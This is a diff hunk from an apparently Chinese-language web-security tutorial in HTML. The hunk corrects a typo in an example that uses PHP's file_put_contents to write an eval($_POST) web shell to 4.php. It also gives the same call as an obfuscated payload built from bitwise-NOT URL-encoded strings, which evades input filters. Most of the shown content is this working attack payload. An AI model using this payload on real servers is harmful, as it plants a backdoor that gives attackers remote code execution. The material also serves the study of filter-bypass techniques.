@@ -184,7 +184,7 @@
 
 <h3 id="例子2："><a href="#例子2：" class="headerlink" title="例子2："></a>例子2：</h3><p>再来一个在php7中利用<code>file_put_contents()</code>写入<code>shell</code>的例子：</p>
 <p><img src="https://i.loli.net/2021/07/28/ZLgrdRDoOp1Kjsv.png" alt="image.png"></p>
-<p>我们要构造的语句为：<code>file_out_contents(&#39;4.php&#39;,&#39;&lt;?php eval(\$_POST[1]);&#39;);</code>构造出来就为：</p>
+<p>我们要构造的语句为：<code>file_put_contents(&#39;4.php&#39;,&#39;&lt;?php eval(\$_POST[1]);&#39;);</code>构造出来就为：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~(%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C))(~(%CB%D1%8F%97%8F),~(%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));</span><br></pre></td></tr></table></figure>
 
 <p>这里要注意的就是要有该目录的写入权限哈</p>
